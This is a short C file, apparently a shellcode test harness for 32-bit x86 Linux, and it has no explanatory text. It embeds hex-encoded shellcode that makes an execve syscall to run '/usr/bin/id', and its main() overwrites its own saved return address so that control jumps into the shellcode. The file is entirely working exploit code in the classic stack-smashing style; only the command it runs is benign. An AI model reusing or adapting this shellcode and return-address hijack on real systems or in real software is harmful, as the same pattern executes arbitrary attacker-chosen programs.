/* Tested on Ubuntu 7.04 x86 */

char sc[] =
"\xeb\x1f\x5e\x31\xc0\x88\x46\x0b\x8d\x1e\x89\x5e\x0c\x89\x46"
"\x10\xb0\x0b\x89\xf3\x8d\x4e\x0c\x8d\x56\x10\xcd\x80\x31\xc0"
"\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x75\x73\x72\x2f\x62\x69"
"\x6e\x2f\x69\x64\x41\x42\x42\x42\x42\x43\x43\x43\x43";

int main()
{
    int *ret;
    ret = (int *)&ret + 2;
    (*ret) = (int) sc;
}
